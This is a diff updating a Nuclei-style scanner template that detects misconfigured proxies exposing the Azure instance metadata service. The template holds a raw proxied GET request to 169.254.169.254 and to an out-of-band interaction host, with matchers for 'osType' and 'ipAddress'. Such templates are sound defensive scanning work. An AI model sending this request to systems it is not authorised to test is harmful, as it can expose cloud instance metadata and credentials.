@@ -1,4 +1,5 @@
 id: metadata-service-azure
+
 # This attack abuses a misconfigured proxy that allows access to the metadata
 # IP or a name which resolves to the IP. A standard proxy request is made to
 # the proxy using the full metadata URL, which the proxy will fulfill to its
@@ -16,20 +17,24 @@ info:
     - https://docs.microsoft.com/en-us/azure/virtual-machines/linux/instance-metadata-service?tabs=windows
     - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
     - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
-  tags: exposure,config,azure,microsoft,proxy,misconfig,metadata
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
     cvss-score: 9.3
     cwe-id: CWE-441
-requests:
+  metadata:
+    max-request: 2
+  tags: exposure,config,azure,microsoft,proxy,misconfig,metadata,vuln
+
+http:
   - raw:
       - |+
         GET http://{{hostval}}/metadata/instance?api-version=2021-02-01 HTTP/1.1
         Host: {{hostval}}
         Metadata: true
+
     payloads:
       hostval:
-        - aws.interact.sh
+        - aws.oast.online
         - 169.254.169.254
     unsafe: true
     matchers:
@@ -39,4 +44,4 @@ requests:
           - "osType"
           - "ipAddress"
         condition: and
-# Enhanced by cs on 2022/02/14
+# digest: 4a0a00473045022100efd4e36d47e73a9acea4341c1852f4e45590a4cc1bdd8c02668ee1de3c4a70090220366f8841a2421abc5bee134cf7a5aecf3302cbba3944c1f1a633d4cff4abb981:922c64590222798bb761d5b6d8e72950
